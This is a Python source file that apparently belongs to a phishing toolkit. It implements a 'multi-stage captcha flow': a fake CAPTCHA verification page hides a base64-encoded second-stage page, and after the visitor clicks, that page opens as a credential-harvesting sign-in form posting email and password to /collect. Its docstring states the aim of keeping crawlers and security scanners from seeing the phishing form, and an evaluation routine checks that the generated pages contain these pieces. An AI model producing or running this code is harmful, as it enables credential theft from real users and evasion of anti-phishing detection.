from __future__ import annotations

import base64
from typing import Any, ClassVar

from app.techniques.base import (
    ApplyResult, BaseTechnique, Category, OptionSpec, Requirement, TechniqueGroup,
)


class CaptchaFlowTechnique(BaseTechnique):
    """
    T17 — Captcha-based multi-stage attack.

    Generates a two-page flow:
      Page 1 (captcha.html): a fake verification page
      Page 2 (credential.html): the actual phishing credential form

    The crawler only sees page 1 and never reaches the credential page.
    """

    TECHNIQUE_ID: ClassVar[int] = 17
    TECHNIQUE_NAME: ClassVar[str] = "Multi-stage Captcha Flow"
    GROUP: ClassVar[TechniqueGroup] = TechniqueGroup.MULTISTAGE_DELIVERY
    CATEGORIES: ClassVar[list[Category]] = [Category.CREDENTIAL_THEFT]
    REQUIREMENTS: ClassVar[list[Requirement]] = [Requirement.ALWAYS]
    DESCRIPTION: ClassVar[str] = (
        "Generates a two-page delivery flow: a fake CAPTCHA gate (page 1) "
        "that crawlers stall on, followed by the credential-harvest page (page 2). "
        "Crawlers that don't interact never see the phishing form."
    )
    OPTION_SPECS: ClassVar[list[OptionSpec]] = [
        OptionSpec(
            name="server_delay_ms",
            description="Artificial server-validation delay after the user clicks the captcha",
            type=int,
            default=1500,
            min_value=0,
            max_value=8000,
        ),
    ]

    def apply(
        self,
        html: str,
        url: str,
        options: dict[str, Any],
        screenshot_bytes: bytes | None = None,
    ) -> ApplyResult:
        import re
        from app.utils.url_utils import parse_url
        parsed, _ = parse_url(url)
        domain = parsed.netloc or url or "example.com"
        server_delay_ms: int = int(options.get("server_delay_ms", 1500))

        lang = self._detect_lang(html, url)
        embedded_real_form = "<form" in html.lower() and "password" in html.lower()
        credential_page = self._build_credential_page(domain, html, lang=lang)

        b64_stage2 = base64.b64encode(credential_page.encode("utf-8")).decode("ascii")
        captcha_page = self._build_captcha_page(domain, b64_stage2, server_delay_ms, lang=lang)

        slug = re.sub(r"[^a-zA-Z0-9_-]+", "_", (parsed.path or "page").strip("/"))
        slug = (slug or "page")[:48].lower()
        stage1_name = f"{slug}_captcha.html"
        stage2_name = f"{slug}_step2.html"

        self.log("info", "captcha_flow_applied",
                 stage1=stage1_name, stage2=stage2_name,
                 embedded=embedded_real_form, delay_ms=server_delay_ms, lang=lang)

        return ApplyResult(
            modified_html=captcha_page,
            modified_url=None,
            extra_files={
                stage1_name: captcha_page.encode(),
                stage2_name: credential_page.encode(),
            },
            change_log=[
                self._make_change(
                    "captcha_multistage_generated",
                    "Generated self-contained 2-stage captcha flow (stage-2 embedded inline)",
                    details={
                        "stage1_name": stage1_name,
                        "stage2_name": stage2_name,
                        "lang": lang,
                        "stage1_size": len(captcha_page),
                        "stage2_size": len(credential_page),
                        "embedded_real_form": embedded_real_form,
                        "server_delay_ms": server_delay_ms,
                    },
                )
            ],
        )

    def _build_captcha_page(
        self, domain: str, b64_stage2: str, delay_ms: int, lang: str = "fa",
    ) -> str:
        from app.utils.i18n import t as _t
        dir_attr = "rtl" if lang == "fa" else "ltr"
        _verifying   = _t("captcha.flow.verifying",   lang)
        _checking    = _t("captcha.flow.checking",    lang)
        _verified    = _t("captcha.flow.verified",    lang)
        _redirecting = _t("captcha.flow.redirecting", lang, domain=domain)
        return f"""<!DOCTYPE html>
<html lang="{lang}" dir="{dir_attr}">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>{_t("captcha.flow.title", lang, domain=domain)}</title>
  <style>
    *{{box-sizing:border-box;margin:0;padding:0;}}
    body{{font-family:Tahoma,Arial,sans-serif;background:#f5f5f5;display:flex;
         align-items:center;justify-content:center;min-height:100vh;
         transition:opacity 0.4s ease;}}
    .card{{background:#fff;padding:40px;border-radius:8px;
           box-shadow:0 2px 16px rgba(0,0,0,.12);max-width:440px;width:100%;}}
    .logo{{font-size:22px;font-weight:bold;color:#4285f4;margin-bottom:24px;}}
    h2{{font-size:18px;margin-bottom:8px;color:#202124;}}
    p{{font-size:14px;color:#5f6368;margin-bottom:24px;}}
    .cf-box{{border:1px solid #e0e0e0;border-radius:4px;padding:16px;
             display:flex;align-items:center;gap:12px;cursor:pointer;
             background:#fafafa;margin-bottom:16px;transition:background 0.2s;}}
    .cf-box:hover{{background:#f0f4ff;}}
    .cf-check{{width:28px;height:28px;border:2px solid #ccc;border-radius:2px;
               flex-shrink:0;font-size:18px;display:flex;align-items:center;
               justify-content:center;transition:all 0.25s;}}
    .cf-label{{font-size:15px;}}
    .cf-brand{{font-size:11px;color:#999;text-align:{'left' if lang == 'fa' else 'right'};}}
    .cf-status{{font-size:13px;color:#4285f4;margin-top:8px;min-height:18px;}}
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">&#9729; {domain}</div>
    <h2>{_t("captcha.flow.heading", lang)}</h2>
    <p>{_t("captcha.flow.instructions", lang, domain=domain)}</p>
    <div class="cf-box" id="__cfbox__" onclick="__verify(this)">
      <div class="cf-check" id="__chk__">&#9633;</div>
      <div class="cf-label" id="__cflbl__">{_t("captcha.flow.checkbox", lang)}</div>
    </div>
    <div class="cf-status" id="__cfst__"></div>
    <div class="cf-brand">{_t("captcha.flow.footer", lang)}</div>
  </div>
  <script>
  var __s2 = '{b64_stage2}';
  function __verify(box) {{
    if (box.dataset.used) return;
    box.dataset.used = '1';
    box.style.cursor = 'default';
    var chk = document.getElementById('__chk__');
    var lbl = document.getElementById('__cflbl__');
    var st  = document.getElementById('__cfst__');
    chk.innerHTML = '&#10003;';
    chk.style.background = '#4285f4';
    chk.style.color = '#fff';
    chk.style.borderColor = '#4285f4';
    if (lbl) lbl.textContent = '{_verifying}';
    if (st)  st.textContent  = '{_checking}';
    setTimeout(function() {{
      if (lbl) lbl.textContent = '{_verified}';
      if (st)  st.textContent  = '{_redirecting}';
      setTimeout(function() {{
        document.body.style.opacity = '0';
        setTimeout(function() {{
          try {{
            var bin = atob(__s2);
            var bytes = new Uint8Array(bin.length);
            for (var i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
            var blob = new Blob([bytes], {{type: 'text/html; charset=utf-8'}});
            window.location.replace(URL.createObjectURL(blob));
          }} catch(e) {{
            document.open(); document.write(atob(__s2)); document.close();
          }}
        }}, 420);
      }}, {max(0, delay_ms - 900)});
    }}, 900);
  }}
  </script>
</body>
</html>"""

    def evaluate(self, html, url, change_log, extra_files):
        from app.techniques.base import EvaluationResult
        signals, issues = [], []

        entry = next((e for e in change_log if e.change_type == "captcha_multistage_generated"), None)
        if entry:
            stage1_name = entry.details.get("stage1_name", "")
            stage2_name = entry.details.get("stage2_name", "")
        else:
            issues.append("No captcha_multistage_generated in change_log (supplementary check)")
            stage1_name = next((k for k in extra_files if k.endswith("_captcha.html")), "")
            stage2_name = next((k for k in extra_files if k.endswith("_step2.html")), "")

        stage1_bytes = extra_files.get(stage1_name, b"") if stage1_name else b""
        stage2_bytes = extra_files.get(stage2_name, b"") if stage2_name else b""
        if stage1_bytes:
            signals.append(f"Stage-1 file {stage1_name!r} present ({len(stage1_bytes)} bytes)")
        elif html:
            signals.append("Stage-1 is the main HTML artifact (captcha page)")
        else:
            issues.append(f"Stage-1 file {stage1_name!r} not in extra_files and no main HTML")
        if stage2_bytes:
            signals.append(f"Stage-2 file {stage2_name!r} present ({len(stage2_bytes)} bytes)")
        else:
            issues.append(f"Stage-2 file {stage2_name!r} not in extra_files")

        stage1_html = stage1_bytes.decode("utf-8", errors="replace") if stage1_bytes else (html or "")
        has_checkbox = "__cfbox__" in stage1_html or "__chk__" in stage1_html
        if has_checkbox:
            signals.append("Stage-1 has CAPTCHA checkbox (__cfbox__/__chk__)")
        else:
            issues.append("Stage-1 missing CAPTCHA checkbox element")

        has_stage2_embed = "var __s2 = '" in stage1_html or "__s2" in stage1_html
        if has_stage2_embed:
            signals.append("Stage-1 has inline base64 stage-2 payload")
        else:
            issues.append("Stage-1 missing embedded stage-2 payload")

        stage2_html = stage2_bytes.decode("utf-8", errors="replace") if stage2_bytes else ""
        has_form = "<form" in stage2_html.lower()
        has_password = "password" in stage2_html.lower()
        if has_form and has_password:
            signals.append("Stage-2 has credential form with password input")
        else:
            issues.append("Stage-2 missing credential form or password field")

        stage1_ok = bool(stage1_bytes) or bool(html)
        passed = stage1_ok and bool(stage2_bytes) and has_checkbox
        return EvaluationResult(
            passed=passed,
            score=self._eval_score(signals, issues),
            signals=signals,
            issues=issues,
            details={
                "stage1_size": len(stage1_bytes),
                "stage2_size": len(stage2_bytes),
                "has_checkbox": has_checkbox,
                "has_form": has_form,
            },
        )

    def _build_credential_page(self, domain: str, original_html: str, lang: str = "fa") -> str:
        if "<form" in original_html.lower():
            return original_html
        from app.utils.i18n import t as _t
        dir_attr = "rtl" if lang == "fa" else "ltr"
        return f"""<!DOCTYPE html>
<html lang="{lang}" dir="{dir_attr}">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>{_t("captcha.flow.signin_title", lang, domain=domain)}</title>
  <style>
    body{{font-family:Tahoma,Arial,sans-serif;background:#fff;display:flex;
         align-items:center;justify-content:center;min-height:100vh;}}
    .card{{width:360px;padding:40px;border:1px solid #e0e0e0;border-radius:8px;}}
    h1{{font-size:24px;margin-bottom:24px;color:#202124;}}
    label{{display:block;font-size:14px;color:#5f6368;margin-bottom:4px;}}
    input{{width:100%;border:1px solid #dadce0;border-radius:4px;
           padding:10px 12px;font-size:16px;margin-bottom:16px;}}
    button{{width:100%;background:#1a73e8;color:#fff;border:none;
            border-radius:4px;padding:12px;font-size:16px;cursor:pointer;}}
  </style>
</head>
<body>
  <div class="card">
    <h1>{_t("captcha.flow.signin_heading", lang)}</h1>
    <form action="/collect" method="POST">
      <label for="email">{_t("form.label.email_or_phone", lang)}</label>
      <input type="email" id="email" name="email" required>
      <label for="password">{_t("form.label.password", lang)}</label>
      <input type="password" id="password" name="password" required>
      <button type="submit">{_t("form.button.next", lang)}</button>
    </form>
  </div>
</body>
</html>"""
